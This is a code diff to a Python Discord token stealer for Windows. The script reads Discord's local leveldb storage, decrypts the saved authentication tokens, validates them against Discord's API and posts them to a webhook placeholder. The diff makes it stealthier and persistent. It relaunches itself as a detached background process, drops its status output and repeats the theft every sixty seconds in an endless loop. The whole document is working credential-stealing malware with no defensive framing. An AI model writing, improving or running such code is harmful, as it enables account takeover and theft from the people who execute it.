@@ -1,12 +1,25 @@
+import subprocess
+import sys
 import os
+import time
 import json
 import base64
 import requests
 import win32crypt
 from Cryptodome.Cipher import AES
 import re
+import ctypes
 
-WEBHOOK_URL = 'ur webhook'
+WEBHOOK_URL = 'INSERT_WEBHOOK'
+
+DETACHED_PROCESS = 0x00000008
+
+if "--child" not in sys.argv:
+    subprocess.Popen(
+        [sys.executable, __file__, "--child"],
+        creationflags=DETACHED_PROCESS
+    )
+    sys.exit()
 
 appdata = os.getenv('APPDATA')
 discord_path = appdata + '\\discord'
@@ -36,43 +49,39 @@ def get_user(token):
         return f"{data['username']}#{data['discriminator']} ({data['id']})"
     return None
 
-found = {}
+def grab_and_send():
+    found = {}
 
-for filename in os.listdir(leveldb_path):
-    if not filename.endswith('.ldb') and not filename.endswith('.log'):
-        continue
-    with open(os.path.join(leveldb_path, filename), 'r', errors='ignore') as f:
-        content = f.read()
-        for encrypted in token_regex.findall(content):
-            encrypted = encrypted.split('dQw4w9WgXcQ:')[1]
-            decrypted = decrypt_value(base64.b64decode(encrypted), key)
-            if decrypted and decrypted not in found:
-                user = get_user(decrypted)
-                if user:
-                    found[decrypted] = user
+    for filename in os.listdir(leveldb_path):
+        if not filename.endswith('.ldb') and not filename.endswith('.log'):
+            continue
+        with open(os.path.join(leveldb_path, filename), 'r', errors='ignore') as f:
+            content = f.read()
+            for encrypted in token_regex.findall(content):
+                encrypted = encrypted.split('dQw4w9WgXcQ:')[1]
+                decrypted = decrypt_value(base64.b64decode(encrypted), key)
+                if decrypted and decrypted not in found:
+                    user = get_user(decrypted)
+                    if user:
+                        found[decrypted] = user
 
-if found:
-    embed = {
-        "title": "valid tokens found",
-        "color": 0xFF0000,
-        "fields": []
-    }
+    if found:
+        embed = {
+            "title": "valid tokens found",
+            "color": 0xFF0000,
+            "fields": []
+        }
 
-    for token, user in found.items():
-        embed["fields"].append({
-            "name": user,
-            "value": f"`{token}`",
-            "inline": False
-        })
+        for token, user in found.items():
+            embed["fields"].append({
+                "name": user,
+                "value": f"{token}",
+                "inline": False
+            })
 
-    data = {
-        "embeds": [embed]
-    }
+        data = {"embeds": [embed]}
+        requests.post(WEBHOOK_URL, json=data)
 
-    r = requests.post(WEBHOOK_URL, json=data)
-    if r.status_code == 204:
-        print("sent tokens embed to webhook")
-    else:
-        print(f"failed to send webhook: {r.status_code} - {r.text}")
-else:
-    print("no valid tokens found")
+while True:
+    grab_and_send()
+    time.sleep(60)
